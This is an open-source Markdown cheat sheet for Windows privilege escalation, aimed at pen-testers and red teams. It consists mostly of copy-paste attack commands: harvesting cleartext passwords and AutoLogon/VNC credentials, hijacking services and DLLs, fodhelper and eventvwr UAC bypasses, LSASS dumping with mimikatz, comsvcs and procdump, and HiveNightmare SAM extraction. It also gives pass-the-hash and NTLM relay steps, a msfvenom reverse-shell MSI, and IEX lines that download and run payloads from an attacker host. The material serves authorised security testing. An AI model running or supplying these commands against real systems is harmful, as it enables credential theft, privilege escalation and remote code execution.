# About this document

This document is an open source markdown document that can be contributed to via github.
If you see a typo, a bug or a mistake, an improvement, or a vector that we've missed please send me a pull request to the master branch via the [repo link](https://github.com/AddaxSoft/OSWindowsPrivEscalation) and I will review it and approve if appropriate asap.

This document is meant for pen-testers, red teams, and the like.

** Needless to state: You're responsible for what you're doing :-)

<br>


# Notes and Format

- Commands should be copiable from the boxes; windows inline command comments are noted as `command &:: comment`, so it still should work without messing your easy copy-paste style commands. Think of it as the hash # in Linux.
- If two commands are required to run it's better to combine them into one line using the `&` delimiter
- If a command is an alternative to another; use the `||` delimiter so when command1 fails the second gets executed.

<br>


# Contributors

- AK | Author and Maintainer [amAK.xyz](https://imAK.xyz), [@xxByte](https://twitter.com/xxByte)
- [Hacktivity.eu](https://hacktivity.eu/) - Offensive Security by Real Hackers

---

Let's get to it!

<br>



# OS Enumeration

In this stage you want to learn as much as possible about the operating system.
Note any odd things and investigate them until you hit a dead-end, then do the next thing.


## Windows Version and Configuration

What Windows is it, what version?

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

What architecture? x86 or x64?

```
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

Are you on Windows 7 or higher? Skip the rest of the enumerations and use the default `gatherNetworkInfo.vbs` script.
This script does all the OS enum magic! Read more about it [here](https://answers.microsoft.com/en-us/windows/forum/windows_7-security/does-anyone-know-what-gathernetworkinfovbs-is-its/63a302a6-cf69-4b9a-a3ef-4b2aff1b2514). Run this one liner to generate the config folder that contains all the txt files, which have very juicy info.
To understand better what is being generated, look into the source of the script `c:\windows\system32\gatherNetworkInfo.vbs`

Note: some txt files will contain errors as you're not admin (yet).

```
cd %TEMP% & cscript c:\windows\system32\gatherNetworkInfo.vbs & cd config & dir
```

List all env variables

```
set
```

List all drives

```
wmic logicaldisk get caption || fsutil fsinfo drives
```

Check installed patches and hotfixes - missing patches are often exploitable

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo | findstr /B /C:"Hotfix(s)"
```

Check if LAPS is deployed (Local Administrator Password Solution)

```
REG QUERY "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

Check AppLocker / WDAC / Constrained Language Mode

```
powershell $ExecutionContext.SessionState.LanguageMode
REG QUERY "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
```

Check Windows Defender / AV status

```
sc query windefend
powershell Get-MpComputerStatus | Select-Object -Property AMRunningMode,RealTimeProtectionEnabled
```

<br>


## Users Enumeration

Get current username

```
echo %USERNAME% || whoami
```

List all users

```
net user
whoami /all
```

List logon requirements; useable for bruteforcing

```
net accounts
```

Get details about a user (i.e. administrator, admin, current user)

```
net user administrator
net user admin
net user %USERNAME%
```

List all local groups

```
net localgroup
```

Get details about a group (i.e. administrators)

```
net localgroup administrators
```

Check current token privileges - look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeLoadDriverPrivilege

```
whoami /priv
```

Check if current user is part of any high-value groups

```
whoami /groups
```

<br>


## Network Enumeration

List all network interfaces

```
ipconfig /all
```

List current routing table

```
route print
```

List the ARP table

```
arp -A
```

List all current connections

```
netstat -ano
```

List firewall state and current configuration

```
netsh advfirewall firewall dump
netsh advfirewall show allprofiles
```

List all network shares

```
net share
```

Check for cached DNS entries - can reveal internal infrastructure

```
ipconfig /displaydns
```

<br>


## Scheduled Tasks Enumeration

List all scheduled tasks - look for tasks running as SYSTEM with writable binary paths

```
schtasks /query /fo LIST /v
```

PowerShell equivalent with more detail

```
powershell Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

<br>


## Installed Software Enumeration

List installed software - look for vulnerable versions, custom software, and non-standard installs

```
wmic product get name,version,vendor
```

Check both registry hives for installed software (more complete than wmic)

```
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName DisplayVersion"
REG QUERY "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName DisplayVersion"
```

<br>


## Startup Programs Enumeration

List startup programs - look for writable paths

```
wmic startup get Caption,Command,User
REG QUERY "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

<br>



# Looting Clear Text Passwords


## Searching in Files

Quick peek into common password files

Note: If you found encrypted contents, decrypt them with gpprefdecrypt.py. Encoded passwords are decoded using base64.

```
TYPE c:\sysprep.inf
TYPE c:\sysprep\sysprep.xml
TYPE %WINDIR%\Panther\Unattend\Unattended.xml
TYPE %WINDIR%\Panther\Unattended.xml
```

Search for file contents

```
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
```

Search for a file with a certain filename

```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

Search for web.config files - often contain DB connection strings with credentials

```
dir /s /b web.config
findstr /si "connectionString" C:\inetpub\*.config
```

Check IIS configuration

```
TYPE C:\inetpub\wwwroot\web.config
TYPE C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Check common credential locations for cloud tools and dev environments

```
TYPE %USERPROFILE%\.aws\credentials
TYPE %USERPROFILE%\.ssh\id_rsa
dir /s /b %USERPROFILE%\.config\
```

<br>


## Searching in Registry

Search the registry for key names

```
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```

Search the registry for any clear text passwords in key values

Note: value of each key will be printed out too

```
REG QUERY HKLM /F "password" /t REG_SZ /S
REG QUERY HKCU /F "password" /t REG_SZ /S
```

Read a value of a certain sub key

```
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
```

Check for AutoLogon credentials - extremely common finding

```
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Check VNC stored passwords

```
REG QUERY "HKCU\Software\ORL\WinVNC3\Password"
REG QUERY "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
```

Check PuTTY stored sessions

```
REG QUERY "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

<br>


## Processes Enum

What processes are running?

```
tasklist /v
```

Which processes are running as "system"

```
tasklist /v /fi "username eq system"
```

Do you have PowerShell magic?

```
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```

Check for interesting processes - password managers, backup agents, AV, EDR

```
tasklist /v | findstr /I "keepass bitwarden veeam backup splunk crowdstrike carbon sentinel"
```

<br>


## Credential Manager and DPAPI

Dump Windows Credential Manager entries (runs as current user)

```
cmdkey /list
```

If entries exist, abuse them with runas

```
runas /savecred /user:DOMAIN\Administrator "cmd.exe /c whoami > C:\temp\out.txt"
```

List DPAPI master keys (requires user context)

```
dir /s /b %APPDATA%\Microsoft\Protect\
```

<br>



# Abusing Weak Services


## Spot Weak Services Using PowerSploit's PowerUP

Usage and details of this script can be found [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```


## Unquoted Service Paths

A service binary path with spaces and no quotes can be hijacked. Windows will try each path segment as an executable before reaching the real one.
Example: `C:\Program Files\Some Service\service.exe` will cause Windows to attempt `C:\Program.exe` first.

Enumerate unquoted service paths automatically

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

PowerShell alternative

```
powershell Get-WmiObject -class Win32_Service -Property Name,DisplayName,PathName,StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

Check write permissions on the exploitable directory

```
icacls "C:\Program Files\Vulnerable App"
```

If writable, drop a malicious binary at the hijackable path, then restart the service

```
sc stop VulnerableService & sc start VulnerableService
```

<br>


## Weak Service Binary Permissions

Check permissions on service binaries directly - if you can overwrite the binary you own the service account

```
for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /i /v "svchost"') do @echo %a >> C:\Temp\paths.txt & @icacls "%a"
```

PowerShell one-liner

```
powershell Get-WmiObject win32_service | select Name,PathName | where {$_.PathName -ne $null} | foreach {icacls $_.PathName}
```

<br>


## Weak Service Registry Permissions

If you can write to a service's registry key you can change the ImagePath to point to your binary

```
powershell Get-Acl HKLM:\System\CurrentControlSet\Services\* | Format-List * | findstr /i "everyone users interactive builtin"
```

Manual check on a specific service

```
REG QUERY "HKLM\System\CurrentControlSet\Services\VulnerableService"
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\VulnerableService
```

Modify ImagePath if writable

```
REG ADD "HKLM\System\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_SZ /d "C:\Temp\evil.exe" /f
```

<br>


## AlwaysInstallElevated

If both registry keys are set to 1, any user can install MSI packages as SYSTEM.

```
REG QUERY HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REG QUERY HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return 0x1, generate a malicious MSI and install it

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

<br>



# Token Impersonation and Privilege Abuse


## SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

These privileges are commonly assigned to service accounts (IIS, MSSQL, etc.) and are directly exploitable to get SYSTEM.

Check if you have them

```
whoami /priv | findstr /i "impersonate assignprimarytoken"
```

Modern potato family exploits - choose based on OS version:

- **GodPotato** - Windows Server 2012 to 2022, Windows 8 to 11
- **SweetPotato** - Windows 10 / Server 2016-2019
- **PrintSpoofer** - Windows 10 / Server 2016-2019 with named pipe impersonation
- **RoguePotato** - Windows Server 2016-2019

PrintSpoofer example (SYSTEM shell from service account with SeImpersonate)

```
PrintSpoofer.exe -i -c cmd
```

GodPotato example

```
GodPotato.exe -cmd "cmd /c whoami"
```

<br>


## SeBackupPrivilege

Allows reading any file regardless of DACL. Can be used to dump SAM/SYSTEM hives and crack local hashes.

```
whoami /priv | findstr "SeBackupPrivilege"
```

Use robocopy with backup flag to copy protected files

```
robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM
```

Or use the diskshadow + DLLs method for domain controller NTDS.dit exfil (requires SeBackupPrivilege + domain context).

<br>


## SeLoadDriverPrivilege

Allows loading arbitrary kernel drivers. Can be leveraged to load a vulnerable driver and escalate to SYSTEM via kernel exploit.

Check for the privilege

```
whoami /priv | findstr "SeLoadDriverPrivilege"
```

Common path: load a vulnerable driver (e.g., Capcom.sys), exploit the kernel callback, get SYSTEM.
Reference: https://github.com/TarlogicSecurity/EoPLoadDriver

<br>


## SeTakeOwnershipPrivilege

Allows taking ownership of any file or object. Can be used to take ownership of sensitive binaries or registry keys and modify them.

```
whoami /priv | findstr "SeTakeOwnership"
```

Take ownership of a file

```
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant %USERNAME%:F
```

<br>



# DLL Hijacking


## Finding Hijackable DLL Paths

When a process loads a DLL without a full path, Windows searches in a predictable order. If any directory in that search order is writable by a low-privilege user, a malicious DLL can be planted there.

Default DLL search order (safe DLL search mode on):
1. Directory of the application
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

Use Procmon (Sysinternals) on the attacker-controlled machine to identify DLL load failures with `NAME NOT FOUND` and `PATH NOT FOUND` results, then check if the search path directories are writable.

Quick check for writable directories in PATH

```
for %A in ("%path:;=";"%") do @echo %~A & icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\"
```

<br>


## Phantom DLL Hijacking

Some legitimate services attempt to load DLLs that don't exist on disk. If the load path is writable, just drop the DLL there.

Common phantom DLL targets for auto-elevated or SYSTEM services - enumerate with Procmon filter:
- `Filter: Result is NAME NOT FOUND`
- `Filter: Path ends with .dll`
- `Filter: Process Name is the target service`

<br>


## DLL Hijacking via Startup Folder

If a program in a startup folder loads DLLs from a user-writable path, planting a DLL gives persistence and potentially elevated execution on next login or reboot.

<br>



# Exploiting Weak Permissions on Filesystem Objects


## Writable Paths in SYSTEM or High-Privilege Process Working Directories

Use accesschk to find world-writable directories

```
accesschk.exe -uws "Everyone" "C:\Program Files"
accesschk.exe -uws "BUILTIN\Users" "C:\"
```

PowerShell equivalent

```
powershell Get-ChildItem "C:\Program Files" -Recurse | Get-Acl | where {$_.AccessToString -match "Everyone\sAllow\s\sFull"}
```

<br>


## Writable Scheduled Task Binaries

Cross-reference task binary paths with writable file checks

```
schtasks /query /fo LIST /v | findstr "Task To Run"
```

Then check permissions on each binary path with icacls or accesschk.

<br>



# UAC Bypass Techniques

UAC bypass is relevant when you have a medium-integrity process and need to reach high integrity without triggering a UAC prompt.


## fodhelper.exe Bypass (Windows 10)

fodhelper.exe is an auto-elevate binary that reads a user-controlled registry key before launching. Writing a command there results in high-integrity execution.

```
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
C:\Windows\System32\fodhelper.exe
```

Clean up after exploitation

```
REG DELETE "HKCU\Software\Classes\ms-settings\" /f
```

<br>


## eventvwr.exe Bypass (Windows 10)

```
REG ADD "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
```

<br>


## DiskCleanup Scheduled Task Bypass (Windows 10)

The SilentCleanup scheduled task runs as SYSTEM with the user's environment, making the TEMP path exploitable.

Reference: https://github.com/enigma0x3/Miscellaneous-PowerShell-Scripts

<br>


## UACME

A maintained repository of working UAC bypasses indexed by method number, covering everything from Windows 7 to Windows 11.

Reference: https://github.com/hfiref0x/UACME

<br>



# Named Pipe Impersonation


## Custom Named Pipe Server

If you have SeImpersonatePrivilege (common on service accounts), you can create a named pipe server, coerce an authentication from a SYSTEM process, and impersonate the token.

The potato exploits (PrintSpoofer, GodPotato) implement this automatically.

For manual implementation reference: https://github.com/itm4n/PrintSpoofer

<br>



# Credential Harvesting from Memory


## Mimikatz

If you reach local admin or SYSTEM, mimikatz can dump credentials from LSASS memory.

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

Dump only hashes (useful when WDigest is disabled)

```
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

Dump cached domain credentials

```
mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
```

<br>


## LSASS Dump Without Mimikatz

Create a minidump of LSASS using built-in Windows tools (for offline processing with pypykatz or Mimikatz)

Using comsvcs.dll (requires SeDebugPrivilege or SYSTEM)

```
powershell "C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full"
```

Using Task Manager (GUI, no command line artifacts):
Right-click lsass.exe in Task Manager > Create Dump File

Process the dump offline with pypykatz

```
pypykatz lsa minidump lsass.dmp
```

<br>


## ProcDump

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

<br>


## Windows Credential Guard Note

When Credential Guard is enabled, LSASS is virtualized and plaintext credentials and NTLM hashes are not accessible from the host OS even as SYSTEM. Verify with:

```
powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

<br>



# Kernel and Driver Exploits


## Checking for Missing Patches

Cross-reference installed patches against known privilege escalation vulnerabilities.

Get installed patches

```
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB"
```

Use Watson (post-exploitation .NET tool) to automatically identify missing patches and map them to exploits

Reference: https://github.com/rasta-mouse/Watson

Common high-value missing patch targets (vary by OS version):

| CVE | Name | Affected Versions |
|---|---|---|
| CVE-2021-36934 | HiveNightmare / SeriousSAM | Windows 10 21H1 and earlier |
| CVE-2021-1732 | Win32k Elevation | Windows 10 1803-20H2, Server 2019 |
| CVE-2020-0787 | BITS EoP | Windows 7-10, Server 2008-2019 |
| CVE-2019-1388 | UAC Certificate Dialog | Windows 7-10, Server 2008-2019 |
| CVE-2016-3309 | Win32k EoP | Windows 7-10, Server 2008-2016 |
| MS16-032 | Secondary Logon | Windows 7-10, Server 2008-2016 |
| MS16-075 | Hot Potato / NTLM Reflection | Windows 7-10, Server 2008-2016 |


## HiveNightmare / SeriousSAM (CVE-2021-36934)

Windows 10 builds ship with overly permissive ACLs on VSS shadow copies of registry hives. Any local user can read the SAM, SYSTEM, and SECURITY hives from shadow copies.

Check if vulnerable

```
icacls C:\Windows\System32\config\SAM
```

If BUILTIN\Users has RX or better, the system is vulnerable.

Copy hives from shadow copy

```
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

Dump hashes offline with secretsdump

```
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

<br>



# Active Directory Related (Local to Domain)


## Pass-the-Hash

If you obtained an NTLM hash from a local account that is reused on other systems, you can authenticate without cracking it.

```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:WORKGROUP /ntlm:<HASH> /run:cmd.exe"
```

Or with Impacket from Linux

```
python3 psexec.py -hashes :<HASH> Administrator@<TARGET_IP>
```

<br>


## NTLM Relay

If you can coerce NTLM authentication from a machine account or privileged user (via LLMNR/NBT-NS poisoning, PrintSpooler abuse, PetitPotam, etc.) and SMB signing is not enforced, relay the authentication to a target system.

Check SMB signing

```
nmap --script smb2-security-mode -p 445 <TARGET>
```

Relay with ntlmrelayx

```
python3 ntlmrelayx.py -tf targets.txt -smb2support
```

<br>


## LAPS Credential Read

If LAPS is deployed and your current user/group has read access to the `ms-Mcs-AdmPwd` attribute, dump local admin passwords for other machines.

```
powershell Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | where {$_."ms-Mcs-AdmPwd" -ne $null} | select Name, ms-Mcs-AdmPwd
```

<br>



# Tools and Binaries

In this section you will find the basic binaries to make your life easier: zip, unzip, wget, and the rest.
These tools are meant to be used for local exploits or to get other privilege-escalation scripts to do deeper scanning for you.


## (De)compressing Files

Download the unzip binary for windows from [here](http://gnuwin32.sourceforge.net/packages/unzip.htm). Unzip it on your attacker host then serve `/bin/unzip.exe` via an http server to your target host.

```
unzip.exe -h &:: usage
unzip.exe file.zip &:: extract
```

For compression (or zip) follow the same steps as above. The only difference is the binaries, you can get them [here](http://gnuwin32.sourceforge.net/packages/zip.htm). zip also has a dependency file called bzip2.dll, which has to be in the same folder and can also be downloaded from the same link.

Once you have the binary and dependency dll you can run:

```
zip -h &:: for usage
zip -9 out.zip file.txt file.jpg file.xls &:: compress files
zip -9 out.zip -r c:\some\directory\ &:: compress directory
zip -e -P PASSWORD_HERE -9 out.zip file1.txt file2.xls file3.jpg &:: with password
zip -e -P PASSWORD_HERE -9 -r c:\some\directory &:: directories with password
```

<br>


## Uploading and Downloading Files

wget using PowerShell

```
powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs/wget.exe -UseBasicParsing -OutFile %TEMP%\wget.exe"
```

wget using bitsadmin (when PowerShell is not present)

```
cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/download/wpecs/wget.exe %TEMP%\wget.exe"
```

Now you have wget.exe that can be executed from %TEMP%. For example, download netcat:

```
%TEMP%\wget https://addaxsoft.com/download/wpecs/nc.exe
```

Certutil download (built-in, often overlooked)

```
certutil -urlcache -split -f https://<ATTACKER>/file.exe C:\Temp\file.exe
```

PowerShell IEX (for in-memory execution, no disk artifact)

```
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://<ATTACKER>/payload.ps1')"
```

<br>


## Automated Enumeration Scripts

These tools perform comprehensive automated checks and are the first thing to run when you land on a new host.

**WinPEAS** - Most comprehensive automated Windows privilege escalation enumeration tool (PEASS-ng suite)

```
winpeas.exe > C:\Temp\winpeas_out.txt
```

Reference: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

**Seatbelt** - .NET post-exploitation tool covering a wide range of security-relevant checks

```
Seatbelt.exe -group=all > C:\Temp\seatbelt_out.txt
```

Reference: https://github.com/GhostPack/Seatbelt

**PowerUp** - PowerShell privilege escalation checks (PowerSploit)

```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

**Watson** - .NET tool that maps missing patches to exploits

Reference: https://github.com/rasta-mouse/Watson

<br>


## Accesschk (Sysinternals)

Accesschk is essential for checking permissions on services, files, registry keys, and processes. Always accept the EULA silently.

```
accesschk.exe /accepteula -uwcqv "Authenticated Users" * &:: weak services
accesschk.exe /accepteula -uwdqs Users C:\ &:: writable dirs
accesschk.exe /accepteula -uwqs Users C:\*.* &:: writable files
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services &:: weak service registry
```

Reference: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

<br>



# Special Thanks and Original Inspirations

- This document wouldn't be here if not for some inspirations:
    * fuzzysecurity's ultimate guide for Windows Privilege escalation, which can be found under this [link](http://www.fuzzysecurity.com/tutorials/16.html).
    * g0tmi1k's Basic Linux Privilege Escalation which can be found under this [link](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
    * Peter Kim's Hackers Playbook 2 - Zero to Hero section [link](http://thehackerplaybook.com/dashboard/)
    * PEASS-ng project by Carlos Polop [link](https://github.com/carlospolop/PEASS-ng)
    * GhostPack tools by SpecterOps [link](https://github.com/GhostPack)
    * itm4n's Windows privilege escalation research [link](https://itm4n.github.io/)
- Offensive Security, which pushed really hard beyond limitations during many hours of training.
